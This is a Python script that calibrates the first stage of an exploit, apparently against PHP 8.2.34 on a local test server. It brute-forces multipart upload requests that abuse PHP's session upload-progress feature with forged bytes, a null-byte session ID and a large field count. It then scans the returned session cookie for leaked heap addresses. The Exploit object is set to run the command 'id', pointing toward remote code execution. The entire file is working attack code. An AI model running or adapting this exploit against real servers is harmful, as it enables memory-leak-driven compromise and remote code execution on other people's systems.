#!/usr/bin/env python3
"""8.2.34: wide stage-1 calibration — N (very wide) x forge-len x SID-length."""
import sys, time, struct, re, urllib.parse
sys.path.insert(0, r"C:\Users\likat\p2s52704")
from exploit import Target, Exploit, build_multipart

t = Target("http://127.0.0.1:18111/index.php", timeout=90.0, verbose=False)

def cookie_of(resp):
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1")) if m else b""

def heap_base(cookie):
    if len(cookie) < 1000:
        return 0
    from collections import Counter
    c = Counter()
    for i in range(0, len(cookie)-8, 8):
        v = int.from_bytes(cookie[i:i+8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, cnt = c.most_common(1)[0]
    return base if cnt >= 8 else 0

ex = Exploit(t, "id", htdata_offset=0x690d8, profile="bookworm")

def reqA():
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [{"name":"PHPSESSID","data":b"\x00"},
              {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
              ex._file_part(), ex._big_field()]
    t.post(build_multipart(parts, b"S"*17), b"S"*17, read_cap=9<<20)

def reqB(sid, n, flen=79, q_val=0x1000, L_off=0x18):
    parts = [{"name":"PHPSESSID","data":sid},
             {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
    for i in range(n):
        parts.append({"name": str(1000+i), "data": (f"v{i:04d}"+"x"*44)[:48].encode()})
    forge = bytearray(b"A"*flen)
    struct.pack_into("<Q", forge, 0x10, q_val)
    forge[L_off] = ord("L")
    parts.append({"name":"1999","data":bytes(forge)})
    return t.post(build_multipart(parts, b"B"*10), b"B"*10, read_cap=9<<20)

print("=== 8.2.34 stage-1: wide N x SID ===")
for sid in (b"attacksessionid0001", b"0123456789abcdef0123456789ab", b"a"*32):
    for n in (100, 300, 500, 700, 841, 1000, 1300, 1600):
        reqA(); time.sleep(0.15)
        ck = cookie_of(reqB(sid, n)); base = heap_base(ck)
        mark = f"LEAK 0x{base:x}" if base else f"c={len(ck)}"
        print(f"  sid={len(sid)}B n={n}: {mark}", flush=True)
        if base:
            print(f"  >>> FOUND sid={len(sid)}B n={n} base=0x{base:x}"); sys.exit(0)
print("=== 8.2.34 stage-1: forge-len scan (sid=19B, n=841) ===")
for flen in (48, 64, 79, 96, 128, 256):
    for q_val in (0x200, 0x400, 0x800, 0x1000, 0x2000):
        reqA(); time.sleep(0.15)
        ck = cookie_of(reqB(b"attacksessionid0001", 841, flen=flen, q_val=q_val)); base = heap_base(ck)
        mark = f"LEAK 0x{base:x}" if base else f"c={len(ck)}"
        print(f"  flen={flen} q=0x{q_val:x}: {mark}", flush=True)
        if base:
            print(f"  >>> FOUND flen={flen} q=0x{q_val:x} base=0x{base:x}"); sys.exit(0)
print("NO stage-1 leak on 8.2.34 in this wide space")
sys.exit(1)
